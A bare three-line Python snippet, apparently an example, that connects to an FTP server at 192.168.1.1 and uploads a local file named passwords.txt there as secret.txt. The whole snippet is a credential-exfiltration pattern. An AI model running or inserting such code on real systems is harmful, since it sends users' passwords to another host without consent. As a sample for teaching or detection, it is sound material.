import ftplib
ftp = ftplib.FTP("192.168.1.1")
ftp.storbinary("STOR secret.txt", open("passwords.txt", "rb"))